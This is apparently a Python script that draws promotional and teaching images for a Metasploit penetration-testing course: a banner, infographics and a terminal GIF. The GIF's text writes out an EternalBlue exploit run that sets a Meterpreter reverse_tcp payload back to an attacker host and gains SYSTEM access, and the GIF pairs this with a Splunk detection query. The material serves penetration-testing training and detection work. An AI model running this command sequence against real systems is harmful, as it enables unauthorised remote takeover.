#!/usr/bin/env python3
"""
Generate Visual Media Assets for Metasploit Framework Masterclass
- Hero Banner (1200x500)
- Module Architecture Infographic (1200x700)
- Attack & Defense Timeline Infographic (1200x700)
- Animated Terminal Walkthrough GIF (920x520)
"""

import os
from PIL import Image, ImageDraw, ImageFont

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
IMAGES_DIR = os.path.join(BASE_DIR, "images")
os.makedirs(IMAGES_DIR, exist_ok=True)

# Fonts
font_huge = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 38)
font_title = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 24)
font_subtitle = ImageFont.truetype("C:/Windows/Fonts/seguisb.ttf", 17)
font_body = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 14)
font_mono = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 13)
font_mono_bold = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 14)
font_badge = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 12)

def draw_window_frame(draw, width, height, title_text, badge_text="", fill_color=(15, 23, 42)):
    draw.rectangle([(0, 0), (width, height)], fill=fill_color)
    draw.rectangle([(0, 0), (width, 42)], fill=(30, 41, 59))
    draw.line([(0, 42), (width, 42)], fill=(51, 65, 85), width=2)
    # macOS window buttons
    draw.ellipse([(14, 14), (26, 26)], fill=(239, 68, 68))
    draw.ellipse([(34, 14), (46, 26)], fill=(245, 158, 11))
    draw.ellipse([(54, 14), (66, 26)], fill=(16, 185, 129))
    draw.text((80, 11), title_text, fill=(226, 232, 240), font=font_title)
    if badge_text:
        badge_w = len(badge_text) * 8 + 18
        bx1 = width - badge_w - 16
        bx2 = width - 16
        draw.rounded_rectangle([(bx1, 10), (bx2, 32)], radius=5, fill=(37, 99, 235))
        draw.text((bx1 + 9, 13), badge_text, fill=(255, 255, 255), font=font_badge)

def generate_hero_banner():
    w, h = 1200, 500
    img = Image.new("RGB", (w, h), color=(10, 15, 30))
    draw = ImageDraw.Draw(img)

    # Ambient lines
    for i in range(0, w, 40):
        draw.line([(i, 0), (i + 180, h)], fill=(18, 28, 55), width=1)

    # Card body
    draw.rounded_rectangle([(40, 35), (w - 40, h - 35)], radius=16, fill=(15, 23, 42), outline=(59, 130, 246), width=2)

    # Top pill badges
    pills = [
        ("OFFICIAL SITE: METASPLOIT.COM", (37, 99, 235)),
        ("GITHUB: RAPID7/METASPLOIT-FRAMEWORK", (16, 185, 129)),
        ("ENTERPRISE PENETRATION TESTING", (168, 85, 247)),
        ("SOC & PURPLE TEAM TELEMETRY", (239, 68, 68)),
    ]
    cur_x = 70
    for text, color in pills:
        pw = len(text) * 8 + 20
        draw.rounded_rectangle([(cur_x, 58), (cur_x + pw, 86)], radius=6, fill=color)
        draw.text((cur_x + 10, 64), text, fill=(255, 255, 255), font=font_badge)
        cur_x += pw + 14

    # Main title
    draw.text((70, 108), "METASPLOIT FRAMEWORK MASTERCLASS", fill=(248, 250, 252), font=font_huge)
    draw.text((70, 160), "Professional Penetration Testing, Exploit Architecture & Security Assessment", fill=(56, 189, 248), font=font_title)

    # Scope overview
    desc_lines = [
        "Master the world's most versatile penetration testing framework: Exploits, Auxiliary modules, Payloads (Staged vs Stageless),",
        "Meterpreter runtime execution, Post-exploitation assessment, msfvenom engineering, PostgreSQL workspace database automation,",
        "Multi-domain assessment (Network, Web, Windows AD, Linux, Cloud), and Blue-Team SIEM / EDR detection engineering."
    ]
    for idx, l in enumerate(desc_lines):
        draw.text((70, 210 + (idx * 24)), l, fill=(203, 213, 225), font=font_body)

    # 4 Bottom stat cards
    boxes = [
        ("MODULAR ENGINE", "7 Module Types", "Exploits • Aux • Payloads • Post", (30, 41, 59)),
        ("PAYLOAD RUNTIME", "Meterpreter & Venoms", "Staged • Stageless • In-Memory", (30, 41, 59)),
        ("DATABASE INTEGRATION", "PostgreSQL Backend", "db_nmap • Hosts • Services • Notes", (30, 41, 59)),
        ("DEFENSE VALIDATION", "Sysmon & SIEM Correlation", "EID 1 • EID 3 • EID 10 • EDR Hunting", (30, 41, 59)),
    ]
    bw = (w - 140 - (3 * 20)) // 4
    for i, (b_title, b_val, b_sub, b_bg) in enumerate(boxes):
        bx = 70 + i * (bw + 20)
        by = 310
        draw.rounded_rectangle([(bx, by), (bx + bw, by + 120)], radius=10, fill=b_bg, outline=(51, 65, 85), width=1)
        draw.text((bx + 16, by + 16), b_title, fill=(148, 163, 184), font=font_badge)
        draw.text((bx + 16, by + 40), b_val, fill=(255, 255, 255), font=font_subtitle)
        draw.text((bx + 16, by + 75), b_sub, fill=(56, 189, 248), font=font_body)

    banner_path = os.path.join(IMAGES_DIR, "metasploit_hero_banner.jpg")
    img.save(banner_path, "JPEG", quality=95)
    print(f"Saved: {banner_path}")

def generate_module_architecture():
    w, h = 1200, 700
    img = Image.new("RGB", (w, h), color=(15, 23, 42))
    draw = ImageDraw.Draw(img)

    draw_window_frame(draw, w, h, "METASPLOIT FRAMEWORK MODULAR SYSTEM ARCHITECTURE", "ARCHITECTURE BREAKDOWN")

    # Categories
    categories = [
        ("1. AUXILIARY", "Information & Scanners", "Protocol enumeration, port scanners,\nservice discovery, fuzzers, and\nnon-destructive compliance checks.\nNo payload delivery required.", (37, 99, 235)),
        ("2. EXPLOITS", "Vulnerability Delivery", "Remote Code Execution (RCE),\nlocal privilege escalations, buffer\noverflows, and web flaws targeted\nat specific vulnerabilities (CVEs).", (239, 68, 68)),
        ("3. PAYLOADS", "Execution Code", "Code executed on target after breach.\nSingles (Inline), Stagers (Tiny hook),\nand Stages (Full Meterpreter DLL).\nReverse vs Bind connections.", (16, 185, 129)),
        ("4. POST", "Session Inspection", "Runs inside an established session.\nHarvests configurations, enumerates\nsoftware, hashes, credentials, and\nnetwork exposure safely.", (168, 85, 247)),
    ]
    card_w = (w - 100 - (3 * 20)) // 4
    for idx, (cat_t, cat_sub, cat_desc, cat_col) in enumerate(categories):
        cx = 50 + idx * (card_w + 20)
        cy = 70
        draw.rounded_rectangle([(cx, cy), (cx + card_w, cy + 240)], radius=10, fill=(30, 41, 59), outline=cat_col, width=2)
        draw.text((cx + 14, cy + 14), cat_t, fill=cat_col, font=font_subtitle)
        draw.text((cx + 14, cy + 42), cat_sub, fill=(255, 255, 255), font=font_mono_bold)
        draw.line([(cx + 14, cy + 68), (cx + card_w - 14, cy + 68)], fill=(51, 65, 85), width=1)
        for d_idx, d_line in enumerate(cat_desc.split("\n")):
            draw.text((cx + 14, cy + 80 + (d_idx * 24)), d_line, fill=(203, 213, 225), font=font_body)

    # Middle Section: Supporting Components
    support_boxes = [
        ("ENCODERS", "shikata_ga_nai, etc. Eliminates bad characters (e.g. \\x00) for binary exploits. Does NOT bypass modern EDR.", (245, 158, 11)),
        ("NOP GENERATORS", "Creates sliding NOP sleds across architectures (x86, x64, ARM, MIPS) to maintain buffer landing reliability.", (56, 189, 248)),
        ("EVASION MODULES", "Generates executable payloads utilizing basic obfuscation techniques for testing defensive sensor coverage.", (168, 85, 247)),
        ("POSTGRESQL DB", "Central database linking hosts, services, captured credentials, loot, and structured assessment findings.", (16, 185, 129))
    ]
    sw = (w - 100 - (3 * 20)) // 4
    for idx, (sb_t, sb_d, sb_c) in enumerate(support_boxes):
        sx = 50 + idx * (sw + 20)
        sy = 335
        draw.rounded_rectangle([(sx, sy), (sx + sw, sy + 150)], radius=8, fill=(19, 30, 49), outline=sb_c, width=1)
        draw.text((sx + 14, sy + 14), sb_t, fill=sb_c, font=font_subtitle)
        # wrap text
        words = sb_d.split(" ")
        lines = []
        cur_line = ""
        for word in words:
            if len(cur_line + " " + word) < 28:
                cur_line += " " + word if cur_line else word
            else:
                lines.append(cur_line)
                cur_line = word
        if cur_line:
            lines.append(cur_line)
        for l_idx, line in enumerate(lines):
            draw.text((sx + 14, sy + 45 + (l_idx * 20)), line, fill=(203, 213, 225), font=font_body)

    # Bottom Foundation Box: Rex Core & Interfaces
    draw.rounded_rectangle([(50, 510), (w - 50, 675)], radius=10, fill=(30, 41, 59), outline=(59, 130, 246), width=2)
    draw.text((70, 524), "FRAMEWORK CORE ARCHITECTURE (REX • MSF CORE • MSF BASE)", fill=(56, 189, 248), font=font_title)

    core_bullets = [
        "REX Library: Fundamental Ruby exploitation primitives (sockets, protocols, SSL, SMB, DCE/RPC, ELF/PE parsers).",
        "MSF Core Library: Provides the event subsystem, session management, module loading runtime, and driver abstraction.",
        "MSF Base Library: High-level UI glue providing msfconsole, msfvenom CLI, and PostgreSQL data persistence APIs.",
        "Interface Layer: msfconsole (Interactive Terminal), msfvenom (Standalone Payload CLI), and RESTful Automation API."
    ]
    for b_idx, b_text in enumerate(core_bullets):
        draw.text((70, 560 + (b_idx * 26)), f"•  {b_text}", fill=(226, 232, 240), font=font_body)

    out_path = os.path.join(IMAGES_DIR, "metasploit_module_architecture.jpg")
    img.save(out_path, "JPEG", quality=95)
    print(f"Saved: {out_path}")

def generate_attack_defense_timeline():
    w, h = 1200, 700
    img = Image.new("RGB", (w, h), color=(15, 23, 42))
    draw = ImageDraw.Draw(img)

    draw_window_frame(draw, w, h, "METASPLOIT PROFESSIONAL ASSESSMENT & BLUE-TEAM VALIDATION TIMELINE", "ASSESSMENT LIFECYCLE")

    # 5 Sequential Stages
    stages = [
        ("STAGE 1: SCOPE & RECON", "Target Fingerprinting", "Identify hosts & port services.\nExecute db_nmap inside MSF.\nCorrelate CPEs and banners.\nVerify explicit testing scope.", (37, 99, 235)),
        ("STAGE 2: VULN VALIDATION", "Precondition Auditing", "Search modules by CVE ID.\nInspect info, prerequisites & code.\nExecute check command first.\nConfirm zero service outage risk.", (245, 158, 11)),
        ("STAGE 3: CONTROLLED TEST", "Exploit & Payload Handshake", "Configure RHOSTS, LHOST, LPORT.\nSelect staged vs stageless payload.\nExecute controlled proof of concept.\nObtain verifiable access artifact.", (239, 68, 68)),
        ("STAGE 4: POST FORENSICS", "Session Inspection & Loot", "Execute post modules on session.\nAudit system configs & patch levels.\nAvoid collecting unneeded PII.\nExport loot to assessment database.", (168, 85, 247)),
        ("STAGE 5: DEFENSE AUDIT", "Telemetry & Remediation", "Inspect Sysmon EID 1, 3, 10 & 7.\nVerify SIEM rule alert velocity.\nProduce technical audit report.\nValidate patch resolution in retest.", (16, 185, 129)),
    ]
    cw = (w - 80 - (4 * 16)) // 5
    for idx, (st_t, st_sub, st_d, st_c) in enumerate(stages):
        cx = 40 + idx * (cw + 16)
        cy = 70
        draw.rounded_rectangle([(cx, cy), (cx + cw, cy + 240)], radius=10, fill=(30, 41, 59), outline=st_c, width=2)
        draw.text((cx + 10, cy + 14), st_t, fill=st_c, font=font_subtitle)
        draw.text((cx + 10, cy + 42), st_sub, fill=(255, 255, 255), font=font_mono_bold)
        draw.line([(cx + 10, cy + 68), (cx + cw - 10, cy + 68)], fill=(51, 65, 85), width=1)
        for d_idx, d_line in enumerate(st_d.split("\n")):
            draw.text((cx + 10, cy + 80 + (d_idx * 24)), d_line, fill=(203, 213, 225), font=font_body)

    # Middle Section: Sysmon & SIEM Detection Matrix
    draw.rounded_rectangle([(40, 335), (w - 40, 505)], radius=10, fill=(19, 30, 49), outline=(56, 189, 248), width=2)
    draw.text((60, 348), "🛡️ BLUE TEAM DETECTION TELEMETRY ARTIFACTS (SYSMON & WINDOWS SECURITY LOG)", fill=(56, 189, 248), font=font_title)

    telemetry_items = [
        ("Sysmon Event ID 1 (Process Creation):", "Spawning of cmd.exe / powershell.exe from unexpected parents (e.g. w3wp.exe, spoolsv.exe, sqlservr.exe)."),
        ("Sysmon Event ID 3 (Network Connection):", "Target host initiating outbound connection to external non-standard ports (Reverse TCP payload indicators)."),
        ("Sysmon Event ID 10 (Process Access):", "Source process requesting PROCESS_ALL_ACCESS (0x1FFFFF) or VM memory read/write against LSASS.exe."),
        ("Sysmon Event ID 7 (Image Loaded):", "In-memory reflective DLL injection loading unbacked Meterpreter libraries into remote process memory.")
    ]
    for t_idx, (t_hdr, t_bdy) in enumerate(telemetry_items):
        draw.text((60, 385 + (t_idx * 28)), f"•  {t_hdr}", fill=(245, 158, 11), font=font_mono_bold)
        draw.text((450, 385 + (t_idx * 28)), t_bdy, fill=(226, 232, 240), font=font_body)

    # Bottom Remediation & Reporting Box
    draw.rounded_rectangle([(40, 525), (w - 40, 675)], radius=10, fill=(16, 35, 28), outline=(16, 185, 129), width=2)
    draw.text((60, 538), "🔒 ENTERPRISE ASSESSMENT REMEDIATION BLUEPRINT", fill=(16, 185, 129), font=font_title)

    rem_items = [
        "1. Vulnerability Eradication: Apply vendor security updates immediately; eliminate unauthenticated remote services.",
        "2. Network Microsegmentation: Restrict workstation-to-workstation lateral communication and egress filtering on servers.",
        "3. Attack Surface Reduction (ASR): Enforce Microsoft Defender ASR rules against child processes spawned from Office / Web servers.",
        "4. Continuous Purple-Team Retesting: Re-run non-destructive check modules post-patch to verify complete vulnerability closure."
    ]
    for r_idx, r_text in enumerate(rem_items):
        draw.text((60, 575 + (r_idx * 24)), r_text, fill=(209, 250, 229), font=font_body)

    out_path = os.path.join(IMAGES_DIR, "metasploit_attack_defense_timeline.jpg")
    img.save(out_path, "JPEG", quality=95)
    print(f"Saved: {out_path}")

def generate_live_terminal_gif():
    w, h = 920, 520

    frames_data = [
        ("KALI LINUX • MSFCONSOLE STARTUP & RECONNAISSANCE DISCOVERY",
         "PHASE 1/4: RECONNAISSANCE",
         [
             ("attacker@kali:~$ ", (56, 189, 248)),
             ("msfconsole -q\n", (255, 255, 255)),
             ("[*] Starting the Metasploit Framework console...\n", (148, 163, 184)),
             ("[+] Connected to PostgreSQL Database: msf_prod_workspace\n\n", (16, 185, 129)),
             ("msf6 > ", (239, 68, 68)),
             ("use auxiliary/scanner/smb/smb_version\n", (255, 255, 255)),
             ("msf6 auxiliary(scanner/smb/smb_version) > ", (239, 68, 68)),
             ("set RHOSTS 192.168.1.100\n", (255, 255, 255)),
             ("RHOSTS => 192.168.1.100\n", (203, 213, 225)),
             ("msf6 auxiliary(scanner/smb/smb_version) > ", (239, 68, 68)),
             ("run\n", (255, 255, 255)),
             ("[+] 192.168.1.100:445 - SMB Detected: Windows 10 Pro Build 19041 (SMBv2/v3)\n", (16, 185, 129)),
             ("[*] Auxiliary module execution completed", (56, 189, 248))
         ]),
        ("KALI LINUX • VULNERABILITY VALIDATION VIA CHECK COMMAND",
         "PHASE 2/4: VULNERABILITY CHECK",
         [
             ("msf6 > ", (239, 68, 68)),
             ("use exploit/windows/smb/ms17_010_eternalblue\n", (255, 255, 255)),
             ("msf6 exploit(windows/smb/ms17_010_eternalblue) > ", (239, 68, 68)),
             ("set RHOSTS 192.168.1.100\n", (255, 255, 255)),
             ("RHOSTS => 192.168.1.100\n", (203, 213, 225)),
             ("msf6 exploit(windows/smb/ms17_010_eternalblue) > ", (239, 68, 68)),
             ("check\n", (255, 255, 255)),
             ("[*] 192.168.1.100:445 - Probing target for MS17-010 preconditions...\n", (148, 163, 184)),
             ("[+] 192.168.1.100:445 - The target is vulnerable: Windows SMBv1 exposed!\n\n", (245, 158, 11)),
             ("[NOTE] Vulnerability verified non-destructively without payload delivery", (16, 185, 129))
         ]),
        ("KALI LINUX • CONTROLLED EXPLOIT & METERPRETER SESSION ESTABLISHED",
         "PHASE 3/4: CONTROLLED TEST",
         [
             ("msf6 exploit(windows/smb/ms17_010_eternalblue) > ", (239, 68, 68)),
             ("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n", (255, 255, 255)),
             ("msf6 exploit(windows/smb/ms17_010_eternalblue) > ", (239, 68, 68)),
             ("set LHOST 192.168.1.50\n", (255, 255, 255)),
             ("msf6 exploit(windows/smb/ms17_010_eternalblue) > ", (239, 68, 68)),
             ("run\n", (255, 255, 255)),
             ("[*] Started reverse TCP handler on 192.168.1.50:4444\n", (148, 163, 184)),
             ("[*] 192.168.1.100:445 - Connecting to target service...\n", (226, 232, 240)),
             ("[+] 192.168.1.100:445 - Target OS verified: Windows 10 x64\n", (16, 185, 129)),
             ("[*] Sending stage (200,774 bytes) to 192.168.1.100\n", (56, 189, 248)),
             ("[+] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:49215)\n\n", (16, 185, 129)),
             ("meterpreter > ", (168, 85, 247)),
             ("getuid\n", (255, 255, 255)),
             ("Server username: NT AUTHORITY\\SYSTEM", (239, 68, 68))
         ]),
        ("SPLUNK ENTERPRISE SIEM • SYSMON CORRELATION ALERT & MITRE T1059",
         "PHASE 4/4: BLUE TEAM DETECTION",
         [
             ("SPLUNK SEARCH: ", (168, 85, 247)),
             ("index=windows EventCode=1 (ParentImage=\"*\\\\spoolsv.exe\" OR ParentImage=\"*\\\\w3wp.exe\")\n", (255, 255, 255)),
             ("             | stats count by host, User, Image, CommandLine, ParentCommandLine\n\n", (255, 255, 255)),
             ("🚨 CRITICAL ALERT: Anomalous Process Execution from Network Service Parent\n", (239, 68, 68)),
             ("• Host Endpoint           : WIN-WS01.corp.local (192.168.1.100)\n", (226, 232, 240)),
             ("• Executing User          : NT AUTHORITY\\SYSTEM (Privilege Level: Maximum)\n", (245, 158, 11)),
             ("• Spawned Process         : C:\\Windows\\System32\\cmd.exe\n", (239, 68, 68)),
             ("• Network Indicator       : Outbound socket established to 192.168.1.50:4444\n", (56, 189, 248)),
             ("• MITRE Technique         : T1059.003 (Command & Scripting Interpreter: Windows Cmd)\n\n", (168, 85, 247)),
             ("[ACTION] Automated SOAR Playbook: Host network isolation engaged; analyst paged", (16, 185, 129))
         ])
    ]

    images = []
    for title, badge, lines in frames_data:
        frame_img = Image.new("RGB", (w, h), color=(15, 23, 42))
        draw = ImageDraw.Draw(frame_img)
        draw_window_frame(draw, w, h, title, badge_text=badge)

        draw.rounded_rectangle([(20, 55), (w - 20, h - 20)], radius=8, fill=(11, 17, 32), outline=(51, 65, 85), width=2)
        y = 75
        for text, col in lines:
            parts = text.split("\n")
            for idx, part in enumerate(parts):
                if idx > 0:
                    y += 20
                if part:
                    draw.text((36, y), part, fill=col, font=font_mono)
            if text.endswith("\n"):
                y += 4
        images.append(frame_img)

    gif_path = os.path.join(IMAGES_DIR, "metasploit_live_session_demo.gif")
    images[0].save(
        gif_path,
        save_all=True,
        append_images=images[1:],
        duration=1300,
        loop=0
    )
    print(f"Saved: {gif_path}")

if __name__ == "__main__":
    generate_hero_banner()
    generate_module_architecture()
    generate_attack_defense_timeline()
    generate_live_terminal_gif()
    print("All Metasploit media assets generated successfully.")
